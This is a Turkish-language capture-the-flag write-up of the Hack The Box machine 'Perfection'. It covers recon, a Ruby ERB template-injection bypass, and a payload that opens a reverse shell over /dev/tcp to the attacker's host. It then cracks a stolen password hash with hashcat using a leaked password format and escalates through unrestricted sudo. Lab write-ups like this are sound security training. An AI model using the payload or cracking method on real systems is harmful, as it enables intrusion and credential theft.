---

title: 🟢 HTB - Perfection
author: Acivik
date: 2024-07-06 11:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, perfection, walktrough, easy, linux]

---

![https://i.ibb.co/vLLfnK3/Perfection.png](https://i.ibb.co/vLLfnK3/Perfection.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

nmap taraması 22 ssh ve 80 http portu olmak üzere 2 adet açık port bildirir.

```bash
**┌──(root㉿kali)-[~/HTB/perfection]
└─# nmap -p22,80 10.10.11.253 -sVC -Pn --min-rate=1000 -oN openports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 00:55 EDT
Nmap scan report for 10.10.11.253 (10.10.11.253)
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds

┌──(root㉿kali)-[~/HTB/perfection]
└─#**
```

OpenSSH sürümüne bakacak olursak muhtemelen Ubuntu Jammy 22.04LTS çalışıyor.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">Web Sitesi</span>

![https://i.ibb.co/3ThBc5j/resim-2024-06-28-075946022.png](https://i.ibb.co/3ThBc5j/resim-2024-06-28-075946022.png)

Öğrenciler için basit bir hesaplama işlemi yapan web sayfası.

Sunucunun response yanıtındaki başlıklar şu şekilde:

```bash
┌──(root㉿kali)-[~/HTB/perfection]
└─# curl -I http://10.10.11.253/
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 28 Jun 2024 06:10:14 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3842
Connection: keep-alive
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
```

Http servisi sağlayan bir ruby kütüphanesi kullanılıyor.

Web sayfasındaki hesaplayıcı ise şu şekilde:

![https://i.ibb.co/N6bZxs0/image.png](https://i.ibb.co/N6bZxs0/image.png)

# <span style="color:#AA0E1C"><b># Foothold - Shell as susan</b>

Gönderdiğim requesti burp aracı üzerinden inceliyorum

![https://i.ibb.co/6v4zR5v/image.png](https://i.ibb.co/6v4zR5v/image.png)

Gönderilen parametreler sonuç olarak sunuluyor. Bu noktada SSTI zafiyetini test etmek istiyorum. Hatırlarsanız sunucu ruby kütüphanesi kullanıyordu bu yüzden ruby’e uygun payloadlar deniyorum.

![https://i.ibb.co/X45LZTj/image.png](https://i.ibb.co/X45LZTj/image.png)

Zararlı input olarak algıladı. Bazı bypass teknikleri deniyorum.

![https://i.ibb.co/tC9npkW/image.png](https://i.ibb.co/tC9npkW/image.png)

Zafiyeti tespit etmiş oldum. Artık reverse shell almaya çalışabilirim.

![https://i.ibb.co/tC9npkW/image.png](https://i.ibb.co/tC9npkW/image.png)

`test%0A<%= system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.3/9001 <&1'") %>`

Payloadı html ile encode edersek başarılı bir şekilde shell alabilirim.

```bash
┌──(root㉿kali)-[~/HTB/perfection]
└─# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.253] 53696
bash: cannot set terminal process group (1028): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ 
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: susan → root</b></span>

Susan kullanıcısından shell aldım. Home dizini içerisindeki dosyaları inceliyorum.

```bash
susan@perfection:~/Migration$ pwd
/home/susan/Migration
susan@perfection:~/Migration$ ls
pupilpath_credentials.db
susan@perfection:~/Migration$ strings pupilpath_credentials.db 
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
susan@perfection:~/Migration$
```

Bulunan db dosyasını açtığımızda kullanıcı isimleri ve hash benzeri ifadeler karşılıyor bizleri

```bash
susan@perfection:/var/mail$ pwd
/var/mail
susan@perfection:/var/mail$ ls -l
total 4
-rw-r----- 1 root susan 625 May 14  2023 susan
susan@perfection:/var/mail$ cat susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
susan@perfection:/var/mail$
```

Mail klasörü içerisinde hashin nasıl bir algoritmaya sahip olduğunu açıklayan bir mesaj var.

Hashcat kullanarak bunu çözebiliriz.

```bash
┌──(root㉿kali)-[~/HTB/perfection]
└─# hashcat -a 0 -m 1400 hash "susan_nasus_?d?d?d?d?d?d?d?d?d" --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

Susan kullanıcısına ait parolayı elde ettikten sonra `sudo -l` komutu ile neler çalıştırabileceğimizi kontrol ediyorum.

```bash
susan@perfection:/var/mail$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
susan@perfection:/var/mail$ sudo su
root@perfection:/var/mail# whoami
root
root@perfection:/var/mail# id
uid=0(root) gid=0(root) groups=0(root)
root@perfection:/var/mail#
```

Sudo ile tüm komutları çalıştırmamıza izin veriliyor. Bu durumda root olmak için önümde hiç bir engel yok. Gayet kolaydı 🙂

---

# Çözüm Videosu - Youtube
[![HackTheBox - Perfection Çözümü](https://img.youtube.com/vi/cnmP24QiGLc/0.jpg)](https://www.youtube.com/watch?v=cnmP24QiGLc)

---
